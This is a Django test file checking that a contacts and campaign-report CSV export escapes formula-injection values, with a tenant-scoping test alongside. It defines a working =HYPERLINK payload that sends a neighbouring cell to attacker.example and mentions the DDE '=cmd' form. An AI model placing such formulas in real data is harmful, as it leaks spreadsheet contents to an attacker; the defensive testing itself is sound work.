"""
CSV exports are safe to open in a spreadsheet.

The unit tests below are the cheap half. The two integration tests are the ones
that matter, because the bug this prevents is not "the helper is wrong" -- it is
"somebody added a column and forgot the helper", which only an end-to-end
request catches.
"""

from django.contrib.auth import get_user_model
from django.test import SimpleTestCase, TestCase
from rest_framework.test import APIClient

from apps.contacts.models import Contact
from apps.tenants.models import Tenant
from core.csv_utils import csv_safe, csv_safe_row

#: The payload used throughout. `=HYPERLINK(...)` is chosen over the
#: `=cmd|...` DDE form because it needs no macro warning and no legacy Excel --
#: it renders as an ordinary blue link and exfiltrates the neighbouring cell to
#: whoever wrote the contact name.
ATTACK = '=HYPERLINK("https://attacker.example/?"&A1,"Click here")'


class CsvSafeTests(SimpleTestCase):
    def test_formula_characters_are_neutralised(self):
        for value in ("=1+1", "+1", "-1", "@SUM(A1)", ATTACK):
            with self.subTest(value=value):
                self.assertTrue(csv_safe(value).startswith("'"))

    def test_leading_whitespace_does_not_hide_a_formula(self):
        """
        A spreadsheet consumes a leading tab or newline while parsing the cell.

        So "\\t=cmd" reaches the formula parser as "=cmd", and a check that only
        looked at the first character would have passed it straight through.
        """
        for value in ("\t=1+1", "\r=1+1", "\n=1+1"):
            with self.subTest(value=repr(value)):
                self.assertTrue(csv_safe(value).startswith("'"))

    def test_ordinary_values_are_untouched(self):
        for value in ("Priya Sharma", "priya@example.com", "Acme Ltd", ""):
            with self.subTest(value=value):
                self.assertEqual(csv_safe(value), value)

    def test_non_strings_pass_through_unchanged(self):
        """
        Quoting a bool or a datetime would turn a typed column into text.

        None of them can carry a formula in the first place -- the risk is
        entirely in strings a person typed.
        """
        for value in (None, True, False, 0, 42, 3.5):
            with self.subTest(value=value):
                self.assertIs(csv_safe(value), value)

    def test_a_phone_number_keeps_its_meaning(self):
        """
        "+15551234567" is prefixed, and that is correct rather than a nuisance.

        It begins with "+", so a spreadsheet would otherwise evaluate it as an
        expression and show 15551234567 -- losing the leading plus, which is
        the part that makes it dialable. The apostrophe preserves it exactly.
        """
        self.assertEqual(csv_safe("+15551234567"), "'+15551234567")

    def test_row_helper_covers_every_cell(self):
        row = csv_safe_row(["ok", ATTACK, 5, None])
        self.assertEqual(row[0], "ok")
        self.assertTrue(row[1].startswith("'"))
        self.assertEqual(row[2], 5)
        self.assertIsNone(row[3])


class ExportEndpointTests(TestCase):
    """The whole way through a real request, which is where the regression lives."""

    def setUp(self):
        self.tenant = Tenant.objects.create(
            name="CSV Co", slug="csv-co", kind=Tenant.Kind.CUSTOMER,
        )
        self.user = get_user_model().objects.create_user(
            username="csv-owner", password="x", tenant=self.tenant,
        )
        self.client = APIClient()
        self.client.force_authenticate(user=self.user)

    def _body(self, response):
        return b"".join(response.streaming_content).decode("utf-8")

    def test_contact_export_neutralises_a_malicious_name(self):
        Contact.objects.create(
            tenant=self.tenant, created_by=self.user, name=ATTACK, phone="+15557770001",
        )

        response = self.client.get("/api/v1/contacts/contacts/export/")
        self.assertEqual(response.status_code, 200)

        body = self._body(response)
        self.assertIn("HYPERLINK", body, "the value was dropped rather than escaped")
        # The payload is present but can no longer begin a formula: every
        # occurrence is preceded by the apostrophe (inside csv quoting).
        self.assertNotRegex(body, r'(^|[,\n])"?=HYPERLINK')

    def test_campaign_report_export_neutralises_a_malicious_contact_name(self):
        from apps.campaigns.models import Campaign
        from apps.messaging.models import Message
        from apps.whatsapp.models import WhatsAppAccount

        account = WhatsAppAccount.objects.create(
            tenant=self.tenant, user=self.user, name="Line",
        )
        contact = Contact.objects.create(
            tenant=self.tenant, created_by=self.user, name=ATTACK, phone="+15557770002",
        )
        campaign = Campaign.objects.create(
            tenant=self.tenant, created_by=self.user, name="Blast",
            whatsapp_account=account, message_body="hi",
        )
        Message.objects.create(
            tenant=self.tenant, campaign=campaign, whatsapp_account=account,
            contact=contact, to_phone=contact.phone, body="hi", billed_to=self.user,
        )

        response = self.client.get(f"/api/v1/reports/campaigns/{campaign.pk}/export/")
        self.assertEqual(response.status_code, 200)

        body = self._body(response)
        self.assertIn("HYPERLINK", body)
        self.assertNotRegex(body, r'(^|[,\n])"?=HYPERLINK')

    def test_export_is_still_tenant_scoped(self):
        """
        The escaping change must not have widened what an export contains.

        Worth asserting alongside: an export is the single largest disclosure
        in the product, and a refactor of its row builder is exactly where a
        filter gets dropped.
        """
        other = Tenant.objects.create(
            name="Other Co", slug="csv-other", kind=Tenant.Kind.CUSTOMER,
        )
        other_user = get_user_model().objects.create_user(
            username="csv-other-owner", password="x", tenant=other,
        )
        Contact.objects.create(
            tenant=other, created_by=other_user, name="Not Yours", phone="+15558880001",
        )
        Contact.objects.create(
            tenant=self.tenant, created_by=self.user, name="Mine", phone="+15558880002",
        )

        body = self._body(self.client.get("/api/v1/contacts/contacts/export/"))

        self.assertIn("Mine", body)
        self.assertNotIn("Not Yours", body)
